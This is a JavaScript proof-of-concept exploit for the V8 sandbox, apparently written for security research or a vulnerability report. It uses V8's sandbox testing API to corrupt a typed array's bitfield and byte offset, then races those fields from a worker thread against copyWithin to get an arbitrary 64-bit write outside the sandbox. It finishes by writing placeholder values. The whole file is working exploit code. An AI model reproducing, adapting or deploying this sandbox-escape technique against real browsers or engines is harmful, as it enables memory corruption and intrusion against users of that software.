// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kJSArrayBufferBackingStoreOffset = 0x24;
const kJSArrayBufferViewRawByteOffsetOffset = 0x18;
const kJSArrayBufferViewBitFieldOffset = 0x14;
const kJSArrayBufferViewIsLengthTracking = 1;
const kSandboxSizeLog2 = 40;
const kSandboxedPointerShift = 64 - kSandboxSizeLog2;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField64(obj, offset) {
  return memory.getBigUint64(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}
function setField64(obj, offset, value) {
  memory.setBigUint64(obj + offset - kHeapObjectTag, value, true);
}
function gc() {
  new ArrayBuffer(0x7fe00000);
}

function write64(ptr, val, max_tries=10000) {
  let ab = new ArrayBuffer(8);
  let u64arr = new BigUint64Array(ab);
  u64arr[0] = val;

  gc();

  // make it look like length tracking
  setField(getPtr(u64arr), kJSArrayBufferViewBitFieldOffset, kJSArrayBufferViewIsLengthTracking);

  let ab_ofs = getField64(getPtr(ab), kJSArrayBufferBackingStoreOffset) >> BigInt(kSandboxedPointerShift);
  let base = BigInt(Sandbox.base) + ab_ofs;

  // loss of precision for large indices (if targeting address below backing store)
  let target_bigint = (((1n << 64n) + ptr - base) & ((1n << 64n) - 1n)) / 8n;
  let target = Number(target_bigint);
  if (BigInt(target) !== target_bigint) {
    let actual_ptr = (BigInt(target) * 8n + base) & ((1n << 64n) - 1n);
    console.log(`[!] precision loss, target ptr changed! (${ptr.toString(16)} -> ${actual_ptr.toString(16)})`);
  }

  let workerScript = `
    // Prepare corruption utilities.
    const kHeapObjectTag = 1;
    const kBoundedSizeShift = 29n;
    const kJSArrayBufferViewRawByteOffsetOffset = 0x18;
    let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
    function setField64(obj, offset, value) {
      memory.setBigUint64(obj + offset - kHeapObjectTag, value, true);
    }
    let u64arr_ptr = ${getPtr(u64arr)};
    while (true) {
      setField64(u64arr_ptr, kJSArrayBufferViewRawByteOffsetOffset, 0n);
      setField64(u64arr_ptr, kJSArrayBufferViewRawByteOffsetOffset, 16n << kBoundedSizeShift);  // (8 - 16) / 8
    }
  `;
  let worker = new Worker(workerScript, {type: 'string'});

  let tries;
  for (tries = 0; tries < max_tries; tries++) {
    try {
      u64arr.copyWithin(target, 0, 1);
    } catch {}
  }
  worker.terminate();
  setField(getPtr(u64arr), kJSArrayBufferViewBitFieldOffset, 0);
  setField64(getPtr(u64arr), kJSArrayBufferViewRawByteOffsetOffset, 0n);
}

write64(0x424242424240n, 0x434343434343n);
